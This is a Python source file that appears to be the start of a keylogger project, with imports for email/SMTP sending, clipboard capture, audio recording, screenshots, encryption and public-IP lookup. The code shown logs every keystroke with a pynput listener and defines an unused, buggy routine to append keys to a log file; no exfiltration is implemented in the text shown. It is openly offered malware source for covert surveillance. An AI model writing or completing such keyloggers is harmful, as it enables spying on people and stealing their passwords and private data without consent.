# librabries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process
from PIL import ImageGrab
from scipy.stats import false_discovery_control

keys_information = "key_log.txt"
file_path = "C:\\Users\\LENOVO\\PycharmProjects\\PythonProject\\Project"
extend = "\\"

count = 0
keys = []

def on_press(key):
    global keys, count

    print (key)
    keys.append(key)
    count += 1

def write_file(keys, key_information=None):
    with open(file_path + extend + key_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(k + "\n")
                f.close()
            elif k.find("key") == -1:
                f.write(k + "\n")
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

